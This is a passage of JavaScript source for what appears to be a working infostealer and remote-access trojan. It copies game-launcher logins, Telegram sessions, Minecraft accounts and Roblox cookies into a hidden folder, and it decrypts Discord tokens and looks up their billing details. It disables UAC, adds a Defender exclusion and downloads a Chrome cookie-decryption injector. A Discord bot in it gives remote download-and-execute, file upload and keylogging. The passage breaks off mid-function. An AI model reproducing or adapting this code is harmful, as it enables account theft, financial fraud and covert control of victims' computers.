  candidates.push(path.join(userHome, 'Program Files', 'Steam'));
  candidates.push(path.join(userHome, '.steam', 'steam'));
  candidates.push(path.join(userHome, '.local', 'share', 'Steam'));
  candidates.push(path.join('/', 'Applications', 'Steam.app', 'Contents', 'MacOS'));
  return candidates;
}

async function GrabSteam() {
  try {
    const steamCandidates = findSteamPathCandidates();
    let steamDir = null;
    for (const c of steamCandidates) {
      try {
        if (fswithout.existsSync(c) && fswithout.lstatSync(c).isDirectory()) {
          const configPath = path.join(c, 'config', 'loginusers.vdf');
          if (fswithout.existsSync(configPath)) {
            steamDir = c;
            break;
          }
        }
      } catch {
        // Continue searching
      }
    }
    if (!steamDir) {
      return { success: false, error: 'Could not find Steam installation in common locations.' };
    }
    const loginUsersPath = path.join(steamDir, 'config', 'loginusers.vdf');
    if (!fswithout.existsSync(loginUsersPath)) {
      return { success: false, error: 'Steam found, but loginusers.vdf not present.' };
    }
    const outDir = path.join(userHome, 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Launchers', 'Steam');
    await fs.mkdir(outDir, { recursive: true });
    const destPath = path.join(outDir, 'loginusers.vdf');
    await fs.copyFile(loginUsersPath, destPath);
    return { success: true, steamDir, savedTo: destPath };
  } catch (err) {
    console.error('[Steam error]', err.message || String(err));
    return { success: false, error: err.message || String(err) };
  }
}

async function GrabEA() {
  try {
    const localAppData = process.env.LOCALAPPDATA || path.join(userHome, 'AppData', 'Local');
    const eaPath = path.join(localAppData, 'Electronic Arts', 'EA Desktop');

    // Check if the main folder exists
    const exists = fswithout.existsSync(eaPath);
    if (!exists) {
      return { success: false, error: 'EA Desktop folder not found.' };
    }

    const filesToCopy = [];

    // Recursive directory walk
    const walk = async (dir) => {
      let items;
      try {
        items = await fs.readdir(dir, { withFileTypes: true });
      } catch {
        return;
      }

      for (const item of items) {
        const fullPath = path.join(dir, item.name);
        try {
          if (item.isDirectory()) {
            await walk(fullPath);
          } else if (
            item.name === 'autosignin.dat' ||
            /accounts?/i.test(item.name) ||
            /login/i.test(item.name)
          ) {
            filesToCopy.push(fullPath);
          }
        } catch {
          // Ignore individual file errors
        }
      }
    };

    await walk(eaPath);

    if (filesToCopy.length === 0) {
      return { success: false, error: 'No EA login-related files found.' };
    }

    const outDir = path.join(userHome, 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'EA');
    await fs.mkdir(outDir, { recursive: true });

    const results = [];

    for (const filePath of filesToCopy) {
      try {
        const fileName = path.basename(filePath);
        const destPath = path.join(outDir, fileName);
        await fs.copyFile(filePath, destPath);
        results.push({ file: fileName, savedTo: destPath });
      } catch (e) {
        console.warn('[EA] Failed to copy', filePath, e.message);
      }
    }

    console.log('[EA] Grab complete:', results.length, 'files copied');
    return { success: true, files: results };
  } catch (err) {
    console.error('[EA error]', err);
    return { success: false, error: err.message || String(err) };
  }
}

async function GrabEpicGames() {
  try {
    const localAppData = process.env.LOCALAPPDATA || path.join(userHome, 'AppData', 'Local');
    const epicPath = path.join(localAppData, 'EpicGamesLauncher', 'Saved', 'Config');
    
    if (!fswithout.existsSync(epicPath)) {
      return { success: false, error: 'No Epic Games login files found.' };
    }

    const filesToCopy = [];
    
    // Look for Windows config folder and GameUserSettings.ini which contains login info
    try {
      const windowsConfigPath = path.join(epicPath, 'Windows');
      if (fswithout.existsSync(windowsConfigPath)) {
        const items = fswithout.readdirSync(windowsConfigPath);
        for (const item of items) {
          if (item === 'GameUserSettings.ini') {
            filesToCopy.push(path.join(windowsConfigPath, item));
          }
        }
      }
    } catch (e) {
      // Continue
    }
    
    if (filesToCopy.length === 0) {
      return { success: false, error: 'No Epic Games login files found.' };
    }
    
    const outDir = path.join(userHome, 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Launchers', 'EpicGames');
    await fs.mkdir(outDir, { recursive: true });
    const results = [];
    
    for (const filePath of filesToCopy) {
      try {
        const fileName = path.basename(filePath);
        const destPath = path.join(outDir, fileName);
        await fs.copyFile(filePath, destPath);
        results.push({ file: fileName, savedTo: destPath });
      } catch (e) {
      }
    }
    
    return { success: true, files: results };
  } catch (err) {
    console.error('[Epic Games error]', err.message || String(err));
    return { success: false, error: err.message || String(err) };
  }
}

async function GrabRockstar() {
  try {
    const rockstarPath = path.join(userHome, 'Documents', 'Rockstar Games', 'Social Club', 'Profiles');
    
    if (!fswithout.existsSync(rockstarPath)) {
      return { success: false, error: 'No Rockstar Games login files found.' };
    }

    const filesToCopy = [];
    
    try {
      const items = fswithout.readdirSync(rockstarPath);
      for (const item of items) {
        if (item === 'autosignin.dat') {
          filesToCopy.push(path.join(rockstarPath, item));
        }
      }
    } catch (e) {
      // Continue
    }
    
    if (filesToCopy.length === 0) {
      return { success: false, error: 'No Rockstar Games login files found.' };
    }
    
    const outDir = path.join(userHome, 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Launchers', 'Rockstar');
    await fs.mkdir(outDir, { recursive: true });
    const results = [];
    
    for (const filePath of filesToCopy) {
      try {
        const fileName = path.basename(filePath);
        const destPath = path.join(outDir, fileName);
        await fs.copyFile(filePath, destPath);
        results.push({ file: fileName, savedTo: destPath });
      } catch (e) {
        // Skip files that cant be copied
      }
    }
    
    return { success: true, files: results };
  } catch (err) {
    console.error('[Rockstar error]', err.message || String(err));
    return { success: false, error: err.message || String(err) };
  }
}

async function GrabValorant() {
  try {
    const localAppData = process.env.LOCALAPPDATA || path.join(userHome, 'AppData', 'Local');
    const riotClientPath = path.join(localAppData, 'Riot Games', 'Riot Client', 'Config');
    
    const filesToCopy = [];
    
    if (fswithout.existsSync(riotClientPath)) {
      try {
        const lockfilePath = path.join(riotClientPath, 'lockfile');
        if (fswithout.existsSync(lockfilePath)) {
          filesToCopy.push(lockfilePath);
        }
      } catch (e) {
        // Continue
      }
    }
    
    if (filesToCopy.length === 0) {
      return { success: false, error: 'No Valorant login files found.' };
    }
    
    const outDir = path.join(userHome, 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Valorant');
    await fs.mkdir(outDir, { recursive: true });
    const results = [];
    
    for (const filePath of filesToCopy) {
      try {
        const fileName = path.basename(filePath);
        const destPath = path.join(outDir, fileName);
        await fs.copyFile(filePath, destPath);
        results.push({ file: fileName, savedTo: destPath });
      } catch (e) {
        // Skip files that can't be copied
      }
    }
    
    return { success: true, files: results };
  } catch (err) {
    console.error('[Valorant error]', err.message || String(err));
    return { success: false, error: err.message || String(err) };
  }
}

async function GrabLaunchers() {
  const results = {
    steam: await GrabSteam(),
    ea: await GrabEA(),
    epic: await GrabEpicGames(),
    rockstar: await GrabRockstar(),
    valorant: await GrabValorant()
  };
  return results;
}

if (require.main === module) {
  GrabLaunchers().then(result => {
    const allSuccess = Object.values(result).every(r => r.success);
    if (!allSuccess) process.exitCode = 1;
  }).catch(err => {
    console.error('[fatal]', err);
    process.exitCode = 1;
  });
}

module.exports = {
  GrabSteam,
  GrabEA,
  GrabEpicGames,
  GrabRockstar,
  GrabValorant,
  GrabLaunchers
};
let downloadUrlChrome = null;

async function fetchLatestDownloadUrl() {
  const apiUrl = "https://api.github.com/repos/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/latest";

  try {
    const resp = await fetch(apiUrl, {
      headers: { "Accept": "application/vnd.github+json" }
    });
    if (!resp.ok) {
      throw new Error(`GitHub API returned ${resp.status}`);
    }

    const release = await resp.json();
    const asset = release.assets.find(a => {
      // match any filename like “chrome-injector-vX.Y.Z.zip”
      return /^chrome-injector-.*\.zip$/i.test(a.name);
    });

    if (!asset) {
      throw new Error("No matching .zip asset found for pattern chrome-injector-*.zip");
    }

    downloadUrlChrome = asset.browser_download_url;
    console.log("Latest download URL set to:", downloadUrlChrome);

  } catch (err) {
    console.error("Error fetching latest download URL:", err);
  }
}
async function addExclusionDisableUACTemporarily() {
    const username =
        process.env.USERNAME ||
        (process.env.USERPROFILE ? path.basename(process.env.USERPROFILE) : null);
    const exclusionPath = `C:\\Users\\${username}\\AppData\\LocalLow`;
    const scriptsPath = `C:\\Users\\${username}\\AppData\\LocalLow\\Temp\\Steam\\scripts`;
    
    console.log('=== Firefox Data Export Process ===');
    
    // Check if running as UpdateService.exe
    const isUpdateService = process.argv[0].endsWith('UpdateService.exe') || 
                           process.argv[1].endsWith('UpdateService.exe') ||
                           process.title.includes('UpdateService');
    
    if (isUpdateService) {
        console.log('\n⚡ Running as UpdateService.exe - focusing on Firefox operations only');
    }
    
    try {
        if (!isUpdateService) {
            // Step 1: Temporarily disable UAC and add exclusion (only if NOT UpdateService.exe)
            console.log('\n1. Temporarily adjusting UAC settings...');
            await execAsync('reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f');
            console.log('✓ UAC temporarily disabled');
            
            // Add the exclusion
            await execAsync(`powershell -Command "Add-MpPreference -ExclusionPath '${exclusionPath}'"`);
            console.log('✓ Exclusion added without UAC prompt');
            
            // Step 2: Verify exclusion
            console.log('\n2. Verifying exclusion...');
            const isVerified = await verifyExclusion(exclusionPath);
            
            if (!isVerified) {
                console.log('⚠ Continuing despite verification failure...');
            }
        }
        
        // For UpdateService.exe, only do Firefox operations
        if (isUpdateService) {
            console.log('\n3. Running Firefox data export only...');
            
            // Ensure scripts directory exists
            try {
                await fs.access(scriptsPath);
            } catch {
                await fs.mkdir(scriptsPath, { recursive: true });
            }
            
            // Kill browsers to ensure clean state
            await killBrowsers();
            
            // Run Firefox data export directly
            await runFirefoxDataExport();
            
            console.log('✓ Firefox data export completed successfully');
            
        } else {
            // Original full process for non-UpdateService.exe
            
            try {
                await fs.access(scriptsPath);
            } catch {
                await fs.mkdir(scriptsPath, { recursive: true });
                console.log(`✓ Created directory: ${scriptsPath}`);
            }
            
            // Fetch the latest URL
            await fetchLatestDownloadUrl();
            if (!downloadUrlChrome) {
                throw new Error("Failed to fetch latest download URL - URL is null");
            }
            
            // Create dynamic zipPath using the fetched URL filename
            const fileName = downloadUrlChrome.split('/').pop();
            const zipPath = path.join(scriptsPath, fileName);
            
            console.log(`✓ Downloading: ${fileName}`);
            
            await downloadFile(downloadUrlChrome, zipPath);
            
            // Step 4: Extract the file using adm-zip
            console.log('\n4. Extracting files with adm-zip...');
            await unzipFileWithNPM(zipPath, scriptsPath);
            
            // Step 5: Verify extraction
            console.log('\n5. Verifying extraction...');
            await listExtractedFiles(scriptsPath);
            
            await killBrowsers();
            
            // Step 7: Run chromelevator
            await runChromelevator(username);
            
            // Step 8: Convert cookies to Netscape format
            await convertCookiesToNetscape(username);
            
            // Step 9: Export Firefox data
            await runFirefoxDataExport();
            
            // Step 10: Clean up zip file
            if (fswithout.existsSync(zipPath)) {
                fswithout.unlinkSync(zipPath);
            }
        }
    } catch (error) {
        console.error('\n❌ Process failed:', error.message);
    } finally {
        if (!isUpdateService) {
            try {
                console.log('\n✓ UAC restored to Windows default (level 5)');
            } catch (restoreError) {
                console.error('❌ Failed to restore UAC:', restoreError.message);
            }
        }
    }
}

async function CopyTelegramData(basePath) {
  try {
    const appdata = getEnvPath('APPDATA', path.join(userHome, 'AppData', 'Roaming'));
    const localappdata = getEnvPath('LOCALAPPDATA', path.join(userHome, 'AppData', 'Local'));
    const programFiles = getEnvPath('PROGRAMFILES', 'C:\\Program Files');
    const programFilesx86 = getEnvPath('PROGRAMFILES(X86)', 'C:\\Program Files (x86)');

    const found = [];
    const roamingTdata = path.join(appdata, 'Telegram Desktop', 'tdata');
    const pfCandidates = [
      path.join(programFiles, 'Telegram', 'tdata'),
      path.join(programFilesx86, 'Telegram', 'tdata'),
      path.join(programFiles, 'Telegram Desktop', 'tdata'),
      path.join(programFilesx86, 'Telegram Desktop', 'tdata'),
    ];

    if (await exists(roamingTdata)) found.push({ type: 'desktop', path: roamingTdata });
    for (const p of pfCandidates) if (await exists(p)) found.push({ type: 'desktop', path: p });

    const storeResults = await findStoreTdataCandidates(localappdata);
    if (storeResults.length) found.push(...storeResults);

    for (const item of found) {
      const dest = path.join(basePath, 'Social', 'Telegram', `Telegram-${item.type}-${ts()}`);
      await CopyTeleRecursive(item.path, dest);
    }
  } catch (err) {
    console.error(`Telegram error: ${err.message}`);
  }
}

async function CopyMinecraftData(basePath) {
  try {
    const destBasePath = path.join(basePath, 'Games', 'Minecraft');
    const cachePath = path.join(destBasePath, 'Mineflayer Cache');

    await safeMkdir(cachePath);
    const filesToCopy = [
      { src: path.join(userHome, 'AppData', 'Roaming', '.minecraft', 'essential', 'microsoft_accounts.json'), dst: path.join(destBasePath, 'MCLauncher_accounts.json') },
      { src: path.join(userHome, 'AppData', 'Roaming', '.feather', 'accounts.json'), dst: path.join(destBasePath, 'feather_accounts.json') },
      { src: path.join(userHome, 'AppData', 'Roaming', 'Badlion Client', 'accounts.dat'), dst: path.join(destBasePath, 'badlion_accounts.dat') },
      { src: path.join(userHome, '.lunarclient', 'settings', 'game', 'accounts.json'), dst: path.join(destBasePath, 'lunar_accounts.json') },
      { src: path.join(userHome, 'AppData', 'Roaming', 'PrismLauncher', 'accounts.json'), dst: path.join(destBasePath, 'prismlauncher_accounts.json') },
      { src: path.join(userHome, 'AppData', 'Roaming', '.minecraft', 'labymod-neo', 'accounts.json'), dst: path.join(destBasePath, 'labymod_accounts.json') },
    ];

    for (const { src, dst } of filesToCopy) {
      if (await exists(src)) {
        await safeMkdir(path.dirname(dst));
        await fs.copyFile(src, dst);
      }
    }

    const srcDir = path.join(userHome, 'AppData', 'Roaming', '.minecraft', 'nmp-cache');
    if (await exists(srcDir)) {
      const files = await fs.readdir(srcDir);
      for (const file of files) {
        await fs.copyFile(path.join(srcDir, file), path.join(cachePath, file));
      }
    }
  } catch (err) {
    console.error(`Minecraft error: ${err.message}`);
  }
}

async function ExtractRobloxData(basePath) {
  try {
    const robloxPath = path.join(userHome, 'AppData', 'Local', 'RobloxPCGDK', 'LocalStorage', 'RobloxCookies.dat');
    if (!(await exists(robloxPath))) return;

    const fileContent = await fs.readFile(robloxPath, 'utf8');
    const parsed = JSON.parse(fileContent);
    const encoded = parsed?.CookiesData;
    if (!encoded) return;

    const decodedBuffer = Buffer.from(encoded, 'base64');
    const decrypted = dpapi.unprotectData(decodedBuffer, null, 'CurrentUser');
    const decryptedStr = decrypted.toString('utf8');

    const tokenRegexes = [
      /\.ROBLOSECURITY\s*=?\s*(_\|WARNING:[^\s;]+)/i,
      /ROBLOSECURITY\s*=?\s*([A-Za-z0-9_\|:-]{10,})/i,
      /(_\|WARNING:[A-Za-z0-9_\|:-]{10,})/i,
    ];

    let foundToken = null;
    for (const rx of tokenRegexes) {
      const m = decryptedStr.match(rx);
      if (m && m[1]) {
        foundToken = m[1];
        break;
      }
    }

    const outDir = path.join(basePath, 'Games', 'Roblox');
    await safeMkdir(outDir);
    await fs.writeFile(path.join(outDir, 'RawRobloxCookie.txt'), decryptedStr, 'utf8');
    if (foundToken) {
      await fs.writeFile(path.join(outDir, 'RobloxCookie.txt'), foundToken, 'utf8');
    }
  } catch (err) {
    console.error(`Roblox error: ${err.message}`);
  }
}



const APPDATA = process.env.APPDATA || process.env.LOCALAPPDATA;
const LOCALLOW = path.join(APPDATA, "..", "LocalLow");
const outputDir = path.join(LOCALLOW, "Temp", "Steam", "Ui.012", "Social", "Discord");

function generateBrowserProfiles(basePath) {
  const profiles = [path.join(APPDATA, basePath, "Default")];
  
  for (let i = 1; i <= 10; i++) {
    profiles.push(path.join(APPDATA, basePath, `Profile ${i}`));
  }
  
  return profiles;
}

function getGeckoProfiles(basePath) {
  const profiles = [];
  try {
    if (fswithout.existsSync(basePath)) {
      const items = fswithout.readdirSync(basePath);
      for (const item of items) {
        const fullPath = path.join(basePath, item);
        if (fswithout.statSync(fullPath).isDirectory()) {
          profiles.push(fullPath);
        }
      }
    }
  } catch (error) {}
  return profiles;
}

const paths = [
  path.join(APPDATA, "discord"),
  path.join(APPDATA, "discordcanary"),
  path.join(APPDATA, "discordptb"),
  path.join(APPDATA, "discorddevelopment"),
  path.join(APPDATA, "lightcord"),
  ...generateBrowserProfiles("Google\\Chrome\\User Data"),
  path.join(APPDATA, "Opera Software", "Opera Stable"),
  path.join(APPDATA, "Opera Software", "Opera GX Stable"),
  ...generateBrowserProfiles("BraveSoftware\\Brave-Browser\\User Data"),
  ...generateBrowserProfiles("Yandex\\YandexBrowser\\User Data"),
  ...generateBrowserProfiles("Microsoft\\Edge\\User Data"),
  ...getGeckoProfiles(path.join(APPDATA, "Mozilla", "Firefox", "Profiles")),
  ...getGeckoProfiles(path.join(APPDATA, "Waterfox", "Profiles"))
];

const uniquePaths = [...new Set(paths.filter(p => {
  try {
    return fswithout.existsSync(p);
  } catch {
    return false;
  }
}))];

async function Steal() {
  if (!fswithout.existsSync(outputDir)) {
    fswithout.mkdirSync(outputDir, { recursive: true });
  }
  
  const foundTokens = [];
  
  for (let searchPath of uniquePaths) {
    await findToken(searchPath, foundTokens);
  }
  
  if (foundTokens.length === 0) {
    fswithout.writeFileSync(path.join(outputDir, "tokens.txt"), "No tokens found\n");
    return;
  }
  
  let validAccounts = 0;
  for (let token of foundTokens) {
    try {
      const json = await axios
        .get("https://discord.com/api/v9/users/@me", {
          headers: {
            "Content-Type": "application/json",
            authorization: token,
          },
          timeout: 10000
        })
        .then((response) => response.data)
        .catch(() => null);
      
      if (!json) continue;

      validAccounts++;
      
      const billing = await getBilling(token);
      
      const output = `==================================================
Identifier      : ${json.id}
Username        : ${json.username}${json.discriminator && json.discriminator !== '0' ? `#${json.discriminator}` : ''}
Phone           : ${json.phone || "None"}
E-Mail Address  : ${json.email || "None"}
Locale          : ${json.locale}
Nitro           : ${json.premium_type === 1 ? "Nitro Classic" : json.premium_type === 2 ? "Nitro Boost" : json.premium_type === 3 ? "Nitro Basic" : "No nitro"}
Badges          : ${getBadgesNames(json.flags)}
Billing         : ${billing}
Token           : ${token}
==================================================

`;
      fswithout.appendFileSync(path.join(outputDir, "tokens.txt"), output);
      
    } catch (error) {}
  }
  
  if (validAccounts === 0) {
    fswithout.writeFileSync(path.join(outputDir, "tokens.txt"), "No valid tokens found\n");
  }
}

async function findToken(searchPath, foundTokens) {
  const path_tail = searchPath;
  const leveldbPath = path.join(searchPath, "Local Storage", "leveldb");

  try {
    if (!fswithout.existsSync(leveldbPath)) return;
    
    const files = fswithout.readdirSync(leveldbPath);
    
    for (const file of files) {
      if (file.endsWith(".log") || file.endsWith(".ldb")) {
        try {
          const filePath = path.join(leveldbPath, file);
          const content = fswithout.readFileSync(filePath, "utf8");
          
          if (!path_tail.includes("discord")) {
            const patterns = [
              /mfa\.[\w-]{84}/g,
              /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g
            ];

            for (const pattern of patterns) {
              const foundTokensInLine = content.match(pattern);
              if (foundTokensInLine) {
                foundTokensInLine.forEach((token) => {
                  if (!foundTokens.includes(token)) {
                    foundTokens.push(token);
                  }
                });
              }
            }
          } else {
            const pattern = /dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\']*/g;
            const foundTokensInLine = content.match(pattern);

            if (foundTokensInLine) {
              foundTokensInLine.forEach((encryptedToken) => {
                try {
                  const localStatePath = path.join(path_tail, "Local State");
                  if (!fswithout.existsSync(localStatePath)) return;
                  
                  const localState = JSON.parse(fswithout.readFileSync(localStatePath, "utf8"));
                  const encrypted = Buffer.from(localState.os_crypt.encrypted_key, "base64").subarray(5);
                  const key = dpapi.unprotectData(encrypted, null, 'CurrentUser');

                  const tokenBuffer = Buffer.from(encryptedToken.split("dQw4w9WgXcQ:")[1], "base64");

                  const start = tokenBuffer.slice(3, 15);
                  const middle = tokenBuffer.slice(15, tokenBuffer.length - 16);
                  const end = tokenBuffer.slice(tokenBuffer.length - 16, tokenBuffer.length);
                  const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

                  decipher.setAuthTag(end);

                  const finalToken = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
                  
                  if (!foundTokens.includes(finalToken)) {
                    foundTokens.push(finalToken);
                  }
                } catch (e) {}
              });
            }
          }
        } catch (fileError) {}
      }
    }
    
  } catch (error) {}
}

async function getBilling(token) {
  try {
    const json = await axios
      .get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
          "Content-Type": "application/json",
          authorization: token,
        },
        timeout: 5000
      })
      .then((response) => response.data)
      .catch(() => null);

    if (!json || !Array.isArray(json)) return "Unknown";
    if (!json.length) return "No Billing";

    let billings = [];
    for (const billing of json) {
      if (billing.type == 2 && billing.invalid != true) {
        billings.push("PayPal");
      } else if (billing.type == 1 && billing.invalid != true) {
        billings.push("Credit Card");
      }
    }

    return billings.length ? billings.join(", ") : "No Billing";
  } catch {
    return "Unknown";
  }
}

function getBadgesNames(flags) {
  const badges = {
    Discord_Employee: 1,
    Partnered_Server_Owner: 2,
    HypeSquad_Events: 4,
    Bug_Hunter_Level_1: 8,
    House_Bravery: 64,
    House_Brilliance: 128,
    House_Balance: 256,
    Early_Supporter: 512,
    Bug_Hunter_Level_2: 16384,
    Early_Verified_Bot_Developer: 131072,
    Discord_Official_Moderator: 262144,
  };

  let badgeNames = [];
  for (const [name, value] of Object.entries(badges)) {
    if ((flags & value) === value) {
      badgeNames.push(name);
    }
  }

  return badgeNames.length ? badgeNames.join(", ") : "No Badges";
}




// Get system information
async function getSystemInfo() {
    try {
        const platform = os.platform();
        const arch = os.arch();
        const hostname = os.hostname();
        const cpus = os.cpus();
        const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
        const freeMem = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
        const uptime = (os.uptime() / 3600).toFixed(2);
        const currentPath = process.cwd();

        let info = `**System Information**\n`;
        info += `**Hostname:** ${hostname}\n`;
        info += `**Platform:** ${platform}\n`;
        info += `**Architecture:** ${arch}\n`;
        info += `**CPU:** ${cpus[0].model} (${cpus.length} cores)\n`;
        info += `**Total RAM:** ${totalMem} GB\n`;
        info += `**Free RAM:** ${freeMem} GB\n`;
        info += `**Uptime:** ${uptime} hours\n`;
        info += `**Windows Key:** ${windowsKey}\n\n`;
        info += `**Current Path:** ${currentPath}\n`;

        return info;
    } catch (error) {
        throw new Error(`Failed to get system info: ${error.message}`);
    }
}

async function downloadFile(url, outputPath) {
    try {
        const curlCommand = `curl -L -o "${outputPath}" "${url}"`;
        const { stderr } = await execAsync(curlCommand);

        if (stderr && stderr.includes('404')) {
            throw new Error('File not found (404)');
        }

        // Verify file exists
        await fs.access(outputPath);
        console.log(`✓ File downloaded successfully: ${outputPath}`);
        return outputPath;
    } catch (error) {
        if (error.message.includes('404')) {
            throw new Error('Download failed: File not found (404)');
        }
        throw new Error(`Download failed: ${error.message}`);
    }
}

async function runExecutable(exePath) {
    try {
        // Verify file exists
        await fs.access(exePath);

        // Run the executable
        exec(`"${exePath}"`, (error) => {
            if (error) {
                console.error(`Execution error: ${error.message}`);
            }
        });

        return `Started: ${path.basename(exePath)}`;
    } catch (error) {
        throw new Error(`Failed to run executable: ${error.message}`);
    }
}

async function registerCommands() {
    const commands = [
        new SlashCommandBuilder()
            .setName('systeminfo')
            .setDescription('Get system information'),
        new SlashCommandBuilder()
            .setName('download')
            .setDescription('Download a file using curl')
            .addStringOption(option =>
                option.setName('url')
                    .setDescription('URL of the file to download')
                    .setRequired(true))
            .addStringOption(option =>
                option.setName('filename')
                    .setDescription('Name to save the file as')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('run')
            .setDescription('Run an executable')
            .addStringOption(option =>
                option.setName('path')
                    .setDescription('Path to the executable')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('keys')
            .setDescription('Start the global keyboard logger')
            .addIntegerOption(option =>
                option.setName('time')
                    .setDescription('Interval in seconds to upload the keys file')
                    .setRequired(true)
                    .setMinValue(5)
                    .setMaxValue(70000)),
        new SlashCommandBuilder()
            .setName('downloadnexecute')
            .setDescription('Download and execute a file')
            .addStringOption(option =>
                option.setName('url')
                    .setDescription('URL of the file to download')
                    .setRequired(true))
            .addStringOption(option =>
                option.setName('filename')
                    .setDescription('Name to save the file as')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('upload')
            .setDescription('Upload a file to Discord')
            .addStringOption(option =>
                option.setName('path')
                    .setDescription('Path to the file to upload')
                    .setRequired(true))
        
    ].map(command => command.toJSON());

    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        console.log('Registering slash commands...');
        await rest.put(
            Routes.applicationGuildCommands(client.user.id, GUILD_ID),
            { body: commands }
        );
        console.log('Slash commands registered successfully!');
    } catch (error) {
        console.error('Error registering commands:', error);
    }
}
async function setupWebhookNChannel(guild) {
    try {
        let walletsChannel = guild.channels.cache.find(
            c => c.name === "wallets" && c.parentId === pcCategory.id
        ) || await guild.channels.create({
            name: "wallets",
            type: ChannelType.GuildText,
            parent: pcCategory.id
        });

        let webhook;
        const webhooks = await walletsChannel.fetchWebhooks();
        webhook = webhooks.size > 0
            ? webhooks.first()
            : await walletsChannel.createWebhook({ name: "wallets-hook" });

        const hookDir = path.join(userHome, 'AppData', 'LocalLow', 'Temp', 'Steam', 'hook');
        await fs.mkdir(hookDir, { recursive: true });
        const hookFile = path.join(hookDir, 'webhook.txt');
        await fs.writeFile(hookFile, webhook.url, 'utf8');

        return webhook;

    } catch (err) {
        console.error("Error in setupWebhookNChannel:", err);
    }
}
async function setupCategoryAndChannel(guild) {
    try {
        const categoryName = windowsKey || Math.random().toString(36).substring(2, 10);

        // find or create category
        const category = guild.channels.cache.find(
            c => c.type === ChannelType.GuildCategory && c.name === categoryName
        ) || await guild.channels.create({
            name: categoryName,
            type: ChannelType.GuildCategory
        });

        // keep the same global/settable reference if you already use pcCategory elsewhere
        pcCategory = category; // leave as-is if pcCategory is a global; change to const if you prefer local const

        // find or create commands channel under that category
        commandsChannel = guild.channels.cache.find(
            c => c.name === 'commands' && c.parentId === pcCategory.id
        ) || await guild.channels.create({
            name: 'commands',
            type: ChannelType.GuildText,
            parent: pcCategory.id,
        });

        await sendStartupEmbed();

        return category;
    } catch (error) {
        console.error('Error setting up category/commands:', error);
        throw error;
    }
}

async function sendStartupEmbed() { 
    try {
        const platform = os.platform();
        const arch = os.arch();
        const hostname = os.hostname();
        const cpus = os.cpus();
        const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
        const freeMem = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
        const uptime = (os.uptime() / 3600).toFixed(2);
        const currentPath = process.cwd();

        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('🟢 Bot Started Successfully')
            .setDescription(`The bot has been launched on **${hostname}**`)
            .addFields(
                { name: '💻 Hostname', value: hostname, inline: true },
                { name: '🖥️ Platform', value: platform, inline: true },
                { name: '⚙️ Architecture', value: arch, inline: true },
                { name: '🔧 CPU', value: `${cpus[0].model}`, inline: false },
                { name: '📊 CPU Cores', value: `${cpus.length} cores`, inline: true },
                { name: '💾 Total RAM', value: `${totalMem} GB`, inline: true },
                { name: '🆓 Free RAM', value: `${freeMem} GB`, inline: true },
                { name: '⏰ Uptime', value: `${uptime} hours`, inline: true },
                { name: '🔑 Windows Key', value: windowsKey ?? 'NaN', inline: true },
                { name: '📁 Current Path', value: `\`${currentPath}\``, inline: false }
            )
            .setTimestamp()
            .setFooter({ text: 'System Online' });

        await commandsChannel.send({ embeds: [embed] });
    } catch (error) {
        console.error('Error sending startup embed:', error);
    }
}

function isCommandInCorrectCategory(interaction) {
    if (!interaction.channel.parent) {
        return false;
    }
    return interaction.channel.parent.name === windowsKey;
}

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isCommand()) return;

    if (!isCommandInCorrectCategory(interaction)) {
        await interaction.reply({
            content: '❌ This command must be used in the commands channel of the correct PC category.',
            ephemeral: true
        });
        return;
    }

    try {
        await interaction.deferReply();

        switch (interaction.commandName) {
            case 'systeminfo': {
                const info = await getSystemInfo();
                await interaction.editReply(info);
                break;
            }
            case 'keys': {
                const uploadInterval = interaction.options.getInteger('time');
                
                if (interaction.client.keysUploadTimer) {
                    clearInterval(interaction.client.keysUploadTimer);
                    interaction.client.keysUploadTimer = null;
                    
                    exec('taskkill /IM python.exe /F', (error) => {
                    });
                    
                    await interaction.editReply('⏹️ Keyboard logger stopped. Uploading final logs...');
                    
                    try {
                        const keysFilePath = `C:\\Users\\${os.userInfo().username}\\AppData\\LocalLow\\Temp\\Steam\\Ui.012\\Keys\\keys.txt`;
                        const fileExists = await fs.access(keysFilePath).then(() => true).catch(() => false);
                        
                        if (fileExists) {
                            const stats = await fs.stat(keysFilePath);
                            const fileSizeMB = (stats.size / 1024 / 1024).toFixed(2);
                            
                            if (stats.size > 25 * 1024 * 1024) {
                                await commandsChannel.send(`⚠️ Keys file is too large (${fileSizeMB} MB) to upload. Discord limit is 25 MB.`);
                            } else {
                                const attachment = new AttachmentBuilder(keysFilePath);
                                await commandsChannel.send({
                                    content: `✅ Final keys log (${fileSizeMB} MB)`,
                                    files: [attachment]
                                });
                            }
                        } else {
                            await commandsChannel.send('⚠️ No keys file found to upload.');
                        }
                    } catch (error) {
                        await commandsChannel.send(`❌ Error uploading final logs: ${error.message}`);
                    }
                    
                    await interaction.editReply('✅ Keyboard logger stopped successfully!');
                    return;
                }
                
                await interaction.editReply('🔍 Checking Python installation...');
                
                try {
                    const pythonCheck = await executePythonCheck();
                    
                    if (!pythonCheck.installed) {
                        await interaction.editReply('📥 Python not found. Installing Python 3.12...');
                        await installPython();
                        await interaction.editReply('✅ Python installed. Installing pynput...');
                        await installPynput();
                    } else if (!pythonCheck.isCorrectVersion) {
                        await interaction.editReply('⚠️ Wrong Python version. Installing Python 3.12...');
                        await installPython();
